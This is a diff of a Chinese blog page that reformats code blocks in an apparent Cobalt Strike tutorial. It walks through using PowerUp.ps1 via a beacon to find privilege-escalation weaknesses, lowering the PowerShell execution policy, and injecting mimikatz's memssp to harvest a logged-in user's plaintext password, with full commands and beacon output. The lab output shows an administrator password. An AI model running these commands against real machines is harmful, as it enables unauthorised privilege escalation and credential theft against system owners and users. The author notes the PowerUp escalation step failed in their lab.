@@ -454,15 +454,95 @@
 <p>其中<code>PowerUp.ps1</code>文件可从这里下载：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
 </blockquote>
 <h1 id="0x01-PowerUp-的使用"><a href="#0x01-PowerUp-的使用" class="headerlink" title="0x01 PowerUp 的使用"></a>0x01 PowerUp 的使用</h1><p>执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import PowerUp.ps1</span><br><span class="line">powershell invoke-allchecks</span><br></pre></td></tr></table></figure>
-
+<pre><code>powershell-import PowerUp.ps1
+powershell invoke-allchecks</code></pre>
 <p>详细运行过程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import PowerUp.ps1</span><br><span class="line">[*] Tasked beacon to import: PowerUp.ps1</span><br><span class="line">[+] host called home, sent: 275084 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell invoke-allchecks</span><br><span class="line">[*] Tasked beacon to run: invoke-allchecks</span><br><span class="line">[+] host called home, sent: 313 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[*] Running Invoke-AllChecks</span><br><span class="line">[+] Current user already has local administrative privileges!</span><br><span class="line">[*] Checking for unquoted service paths...</span><br><span class="line"></span><br><span class="line">[*] Checking service executable and argument permissions...</span><br><span class="line">[+] received output:</span><br><span class="line">ServiceName                     : AeLookupSvc</span><br><span class="line">Path                            : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">ModifiableFile                  : C:\Windows\system32</span><br><span class="line">ModifiableFilePermissions       : GenericAll</span><br><span class="line">ModifiableFileIdentityReference : BUILTIN\Administrators</span><br><span class="line">StartName                       : localSystem</span><br><span class="line">AbuseFunction                   : Install-ServiceBinary -Name &#39;AeLookupSvc&#39;</span><br><span class="line">CanRestart                      : True</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking service permissions...</span><br><span class="line">[+] received output:</span><br><span class="line">ServiceName   : AeLookupSvc</span><br><span class="line">Path          : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">StartName     : localSystem</span><br><span class="line">AbuseFunction : Invoke-ServiceAbuse -Name &#39;AeLookupSvc&#39;</span><br><span class="line">CanRestart    : True</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking %PATH% for potentially hijackable DLL locations...</span><br><span class="line">[+] received output:</span><br><span class="line">Permissions       : GenericAll</span><br><span class="line">ModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\</span><br><span class="line">IdentityReference : BUILTIN\Administrators</span><br><span class="line">%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\</span><br><span class="line">AbuseFunction     : Write-HijackDll -DllPath &#39;C:\Windows\system32\WindowsPowerS</span><br><span class="line">                    hell\v1.0\\wlbsctrl.dll&#39;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking for AlwaysInstallElevated registry key...</span><br><span class="line">[*] Checking for Autologon credentials in registry...</span><br><span class="line"></span><br><span class="line">[*] Checking for modifidable registry autoruns and configs...</span><br><span class="line">[+] received output:</span><br><span class="line">Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use</span><br><span class="line">                 r Process</span><br><span class="line">Path           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusr</span><br><span class="line">ModifiableFile : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files</span><br><span class="line">                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference&#x3D;BUILTIN\A</span><br><span class="line">                 dministrators&#125;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking for modifiable schtask files&#x2F;configs...</span><br><span class="line">[+] received output:</span><br><span class="line">TaskName     : GoogleUpdateTaskMachineCore</span><br><span class="line">TaskFilePath : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files (</span><br><span class="line">               x86)\Google\Update\GoogleUpdate.exe; IdentityReference&#x3D;BUILTIN\A</span><br><span class="line">               dministrators&#125;</span><br><span class="line">TaskTrigger  : &lt;Triggers xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;windows&#x2F;2004&#x2F;02&#x2F;mi</span><br><span class="line">               t&#x2F;task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;&lt;&#x2F;LogonTrigger&gt;&lt;Cal</span><br><span class="line">               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;&#x2F;StartBoundary&gt;&lt;</span><br><span class="line">               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;&#x2F;DaysInterval&gt;&lt;&#x2F;ScheduleByDay&gt;&lt;&#x2F;Ca</span><br><span class="line">               lendarTrigger&gt;&lt;&#x2F;Triggers&gt;</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"></span><br><span class="line">[*] Checking for unattended install files...</span><br><span class="line">UnattendPath : C:\Windows\Panther\Unattend.xml</span><br><span class="line"></span><br><span class="line">[*] Checking for encrypted web.config strings...</span><br><span class="line">[*] Checking for encrypted application pool and virtual directory passwords...</span><br><span class="line">[*] Checking for plaintext passwords in McAfee SiteList.xml files....</span><br><span class="line">[+] received output:</span><br><span class="line">[*] Checking for cached Group Policy Preferences .xml files....</span><br><span class="line">[+] received output:</span><br></pre></td></tr></table></figure>
+<pre><code>beacon&gt; powershell-import PowerUp.ps1
+[*] Tasked beacon to import: PowerUp.ps1
+[+] host called home, sent: 275084 bytes
 
+beacon&gt; powershell invoke-allchecks
+[*] Tasked beacon to run: invoke-allchecks
+[+] host called home, sent: 313 bytes
+[+] received output:
+[*] Running Invoke-AllChecks
+[+] Current user already has local administrative privileges!
+[*] Checking for unquoted service paths...
+
+[*] Checking service executable and argument permissions...
+[+] received output:
+ServiceName                     : AeLookupSvc
+Path                            : C:\Windows\system32\svchost.exe -k netsvcs
+ModifiableFile                  : C:\Windows\system32
+ModifiableFilePermissions       : GenericAll
+ModifiableFileIdentityReference : BUILTIN\Administrators
+StartName                       : localSystem
+AbuseFunction                   : Install-ServiceBinary -Name &#39;AeLookupSvc&#39;
+CanRestart                      : True
+……内容太多，此处省略……
+
+[*] Checking service permissions...
+[+] received output:
+ServiceName   : AeLookupSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs
+StartName     : localSystem
+AbuseFunction : Invoke-ServiceAbuse -Name &#39;AeLookupSvc&#39;
+CanRestart    : True
+……内容太多，此处省略……
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+[+] received output:
+Permissions       : GenericAll
+ModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\
+IdentityReference : BUILTIN\Administrators
+%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\
+AbuseFunction     : Write-HijackDll -DllPath &#39;C:\Windows\system32\WindowsPowerS
+                    hell\v1.0\\wlbsctrl.dll&#39;
+……内容太多，此处省略……
+
+[*] Checking for AlwaysInstallElevated registry key...
+[*] Checking for Autologon credentials in registry...
+
+[*] Checking for modifidable registry autoruns and configs...
+[+] received output:
+Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use
+                 r Process
+Path           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusr
+ModifiableFile : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files
+                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference=BUILTIN\A
+                 dministrators&#125;
+……内容太多，此处省略……
+
+[*] Checking for modifiable schtask files/configs...
+[+] received output:
+TaskName     : GoogleUpdateTaskMachineCore
+TaskFilePath : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files (
+               x86)\Google\Update\GoogleUpdate.exe; IdentityReference=BUILTIN\A
+               dministrators&#125;
+TaskTrigger  : &lt;Triggers xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mi
+               t/task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;&lt;Cal
+               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;/StartBoundary&gt;&lt;
+               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;/DaysInterval&gt;&lt;/ScheduleByDay&gt;&lt;/Ca
+               lendarTrigger&gt;&lt;/Triggers&gt;
+……内容太多，此处省略……
+
+[*] Checking for unattended install files...
+UnattendPath : C:\Windows\Panther\Unattend.xml
+
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+[+] received output:
+[*] Checking for cached Group Policy Preferences .xml files....
+[+] received output:</code></pre>
 <p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p>
 <p>这时为了复现成功可以来到靶机下，以管理员权限打开 Powershell，运行<code>set-ExecutionPolicy RemoteSigned</code>，输入<code>Y</code>回车，此时系统便能导入<code> PowerUp.ps1</code>文件了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned</span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170</span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y</span><br><span class="line">PS C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
-
+<pre><code>PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned
+执行策略更改
+执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
+中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
+[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y
+PS C:\WINDOWS\system32&gt;</code></pre>
 <p>在运行<code>Invoke-AllChecks</code>后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中<code>AbuseFunction</code>下的命令便能开始提权操作了。</p>
 <p>但是我在自己本地环境中并未复现成功，执行<code>AbuseFunction</code>后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。</p>
 <p>参考网上相关文章后也未果，这也是为什么这一节拖更这么久的原因，因此 PowerUp 的复现过程暂时就没法记录了。</p>
@@ -511,19 +591,42 @@
 </li>
 </ul>
 <p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz !misc::memssp</span><br><span class="line">cd C:\Windows\system32</span><br><span class="line">shell dir mimilsa.log</span><br><span class="line">shell type mimilsa.log</span><br></pre></td></tr></table></figure>
-
+<pre><code>mimikatz !misc::memssp
+cd C:\Windows\system32
+shell dir mimilsa.log
+shell type mimilsa.log</code></pre>
 <p>详细运行过程：</p>
 <p>首先运行<code>mimikatz !misc::memssp</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz !misc::memssp</span><br><span class="line">[*] Tasked beacon to run mimikatz&#39;s !misc::memssp command</span><br><span class="line">[+] host called home, sent: 1006151 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Injected &#x3D;)</span><br></pre></td></tr></table></figure>
-
+<pre><code>beacon&gt; mimikatz !misc::memssp
+[*] Tasked beacon to run mimikatz&#39;s !misc::memssp command
+[+] host called home, sent: 1006151 bytes
+[+] received output:
+Injected =)</code></pre>
 <p>接下来来到<code>C:\Windows\system32</code>目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; cd C:\Windows\system32</span><br><span class="line">[*] cd C:\Windows\system32</span><br><span class="line">[+] host called home, sent: 27 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell dir mimilsa.log</span><br><span class="line">[*] Tasked beacon to run: dir mimilsa.log</span><br><span class="line">[+] host called home, sent: 46 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 BE29-9C84</span><br><span class="line"></span><br><span class="line"> C:\Windows\system32 的目录</span><br><span class="line"></span><br><span class="line">2020&#x2F;07&#x2F;23  21:47                24 mimilsa.log</span><br><span class="line">               1 个文件             24 字节</span><br><span class="line">               0 个目录 17,394,728,960 可用字节</span><br></pre></td></tr></table></figure>
+<pre><code>beacon&gt; cd C:\Windows\system32
+[*] cd C:\Windows\system32
+[+] host called home, sent: 27 bytes
 
+beacon&gt; shell dir mimilsa.log
+[*] Tasked beacon to run: dir mimilsa.log
+[+] host called home, sent: 46 bytes
+[+] received output:
+ 驱动器 C 中的卷没有标签。
+ 卷的序列号是 BE29-9C84
+
+ C:\Windows\system32 的目录
+
+2020/07/23  21:47                24 mimilsa.log
+               1 个文件             24 字节
+               0 个目录 17,394,728,960 可用字节</code></pre>
 <p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p>
 <p>查看<code>mimilsa.log</code>文件内容。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell type mimilsa.log</span><br><span class="line">[*] Tasked beacon to run: type mimilsa.log</span><br><span class="line">[+] host called home, sent: 47 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[00000000:000003e5] \	</span><br><span class="line">[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator	Password123!</span><br></pre></td></tr></table></figure>
-
+<pre><code>beacon&gt; shell type mimilsa.log
+[*] Tasked beacon to run: type mimilsa.log
+[+] host called home, sent: 47 bytes
+[+] received output:
+[00000000:000003e5] \    
+[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!</code></pre>
 <p>成功获取到当前登录用户的明文密码。</p>
 <blockquote>
 <p>参考链接：</p>
@@ -967,7 +1070,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
